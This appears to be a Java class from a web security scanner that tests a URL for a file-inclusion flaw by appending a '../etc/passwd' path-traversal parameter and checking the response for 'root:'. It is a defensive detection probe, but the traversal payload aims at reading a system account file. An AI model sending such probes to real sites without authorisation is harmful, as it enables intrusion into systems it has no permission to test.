package com.security.service.impl;

import com.security.service.FileInclusionService;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
public class FileInclusionServiceImpl implements FileInclusionService {
    @Override
    public boolean testFileInclusion(String url) {
        try {
            // 构造包含测试文件的URL
            String testUrl = url + "?file=../etc/passwd"; // 以Linux系统中的/etc/passwd文件为例

            // 创建URL对象
            URL testUrlObj = new URL(testUrl);

            // 打开连接
            HttpURLConnection connection = (HttpURLConnection) testUrlObj.openConnection();
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);

            // 获取响应码
            int responseCode = connection.getResponseCode();

            // 如果响应码为200，读取响应内容
            if (responseCode == 200) {
                try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                    String inputLine;
                    StringBuilder response = new StringBuilder();

                    while ((inputLine = in.readLine()) != null) {
                        response.append(inputLine);
                    }

                    // 检查响应内容是否包含特定内容，例如/etc/passwd文件的特征内容
                    if (response.toString().contains("root:")) {
                        System.out.println("文件包含漏洞存在！");
                        return true;
                    }
                }
            }
        } catch (Exception e) {
            System.err.println("文件包含测试失败：" + e.getMessage());
        }

        System.out.println("文件包含漏洞不存在或测试失败！");
        return false;
    }

    /*
    * public static void main(String[] args) {
        FileInclusionService fileInclusionService = new FileInclusionServiceImpl();

        // 示例URL
        String testUrl = "http://example.com/vulnerable-page.php";

        // 测试文件包含漏洞
        boolean isVulnerable = fileInclusionService.testFileInclusion(testUrl);
        if (isVulnerable) {
            System.out.println("该Web应用存在文件包含漏洞！");
        } else {
            System.out.println("该Web应用不存在文件包含漏洞！");
        }
    }
    */
}
